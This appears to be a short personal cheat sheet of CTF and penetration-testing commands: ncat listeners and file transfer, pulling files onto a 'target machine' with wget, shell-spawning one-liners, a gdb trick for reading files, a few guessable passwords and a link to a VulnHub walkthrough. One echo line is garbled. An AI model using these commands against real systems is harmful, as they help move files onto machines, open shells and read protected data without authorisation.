# HackNotes 【第一】🐱‍💻

## Introduction to Cyber Security

Cybersecurity is the body of technologies, processes and practices designed to protect networks, computers, programs and data from attack, damage or unauthorized access

## Basics

### nmap-ncat
##### Listen to Inbound Connections
`ncat -l [PORT]`
##### Connect to Remote System
`ncat [IP] [PORT]`
##### Copy Files Using ncat
Receiver: `ncat -l [PORT] > file.ext`
Sender: `ncat [IP] [PORT] --send-only < file.ext`

### SCP (Secure Copy)
##### Basic Syntax
`scp [SOURCE_FILE_PATH] [DESTINATION_FILE_PATH]`
##### Sending File From Remote Host to Local Host
`scp [user]@[IP]:/[PATH]/[PATH]/file.ext outputfile.ext`

### wget
##### Prepate the HTTP Server
`python-m http.server [PORT]`
##### On the Target Machine
`wget [IP/URL]:[PORT] -O filename.ext`

### Spawning 🐚
##### python
`python -c 'import pty; pty.spawn("/bin/sh")'`
##### echo
`echo 'os.system('/bin/bash')'`
##### bash
`/bin/bash -i`
##### sh
`/bin/sh -i`

### Useful Trickeries
##### gdb file read 
`gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit`

### Bad Passwords worth to try
- qazwsxedc
- p4ssw0rd

## Learn From Walkthroughs
- https://www.hackingarticles.in/seppuku1-vulnhub-walkthrough/ (brute forcing basic authentication)
